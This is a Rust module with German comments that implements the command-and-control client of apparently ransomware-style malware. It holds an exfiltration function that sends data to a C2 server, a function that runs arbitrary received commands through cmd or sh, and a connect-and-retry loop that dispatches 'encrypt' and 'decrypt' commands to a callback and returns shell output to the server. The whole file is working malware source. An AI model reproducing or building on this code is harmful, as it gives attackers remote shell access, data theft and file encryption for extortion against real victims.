// Liest die Daten vom Server, beim Befehl Encrypt, wird die on_encrypt funktion aufgerufen
// Sonst werden die übergebenen Befehl ausgeführt

use anyhow::Result;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Output};
use std::thread;
use std::time::Duration;

/// Sendet die Daten einmalig an den C2-Server (Fire-and-Forget)
/// Wird von Lib.rs für den Datei-Preview verwendet
pub fn exfiltrate_data(data: &[u8], c2_addr: &str) {
    if let Ok(mut stream) = TcpStream::connect(c2_addr) {
        let _ = stream.write_all(data);
    }
}

/// Führt einen Shell-Befehl aus (Äquivalent zu Python subprocess.run shell=True)
fn execute_shell_command(command: &str) -> String {
    let output_result: std::io::Result<Output> = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", command]).output()
    } else {
        Command::new("sh").arg("-c").arg(command).output()
    };

    match output_result {
        Ok(out) => {
            // stdout und stderr kombinieren wie im Python Script
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

/// Verbindet sich zum C2 und wartet auf Befehle.
/// Implementiert Retry-Logik wie das Python-Skript.
pub fn start_c2_loop<F>(target_dir: String, c2_ip: &str, c2_port: u16, on_command: F)
where
    F: Fn(&str) -> Result<String>,
{
    let server_addr = format!("{}:{}", c2_ip, c2_port);
    let mut retries = 5; // Wie im Python Script

    println!("[*] Versuche Verbindung zum C2 Server herzustellen...");

    loop {
        match TcpStream::connect(&server_addr) {
            Ok(mut stream) => {
                println!("[*] Mit C2 Server verbunden");

                let mut buffer = [0u8; 4096];

                loop {
                    // Befehl empfangen
                    match stream.read(&mut buffer) {
                        Ok(0) => break, // Verbindung geschlossen
                        Ok(n) => {
                            let raw_cmd = String::from_utf8_lossy(&buffer[..n]);
                            let command = raw_cmd.trim();

                            if command.is_empty() {
                                continue;
                            }

                            // Logik: Encrypt Befehl oder Shell Befehl
                            let output = if command == "encrypt" {
                                on_command(&target_dir).unwrap_or_else(|e| format!("Error: {}", e))
                            } else if let Some(path) = command.strip_prefix("encrypt ") {
                                on_command(path).unwrap_or_else(|e| format!("Error: {}", e))
                            } else if command == "decrypt" {
                                on_command("DECRYPT_MODE")
                                    .unwrap_or_else(|e| format!("Error: {}", e))
                            } else {
                                // Standard Shell Execution
                                execute_shell_command(command)
                            };

                            // Ergebnis senden
                            if stream.write_all(output.as_bytes()).is_err() {
                                break;
                            }
                        }
                        Err(_) => break, // Fehler beim Lesen
                    }
                }
                println!("[*] Verbindung zum C2 Server verloren ...");
            }
            Err(e) => {
                println!("[!] Connection Fehler: {}", e);
            }
        }

        // Retry Logik aus Python Script
        if retries > 0 {
            retries -= 1;
            thread::sleep(Duration::from_secs(5));
        } else {
            // "sys.exit(0)"
            std::process::exit(0);
        }
    }
}
